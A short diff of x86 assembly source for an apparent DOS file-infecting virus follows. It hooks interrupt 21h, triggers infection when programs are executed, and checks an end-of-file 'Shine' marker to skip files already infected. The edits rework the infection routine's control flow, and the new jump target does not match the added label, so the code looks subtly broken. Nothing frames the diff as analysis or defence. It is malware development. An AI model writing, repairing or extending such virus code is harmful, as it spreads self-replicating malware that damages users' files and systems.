@@ -84,7 +84,7 @@ new_int21:
      je send_msg          ; Report that we are in memory
      cmp ax, 4b00h        ; Load and Execute (Exec), function 0
      je infect            ; On entry: DS:DX = ASCIIZ filename pointer
-
+.restore_state
      pop bp
      popa
 .call_int21:
@@ -152,10 +152,10 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      rep cmpsb       ; Is EOF = 'Shine'?
      je .abort_infection  ; Yes, abort infection
      push bx         ; Nope, let's infect this bad boy             
-     
+     pop bx
 
 .abort_infection:
-     ret
+     jmp restore_state
 
 
 
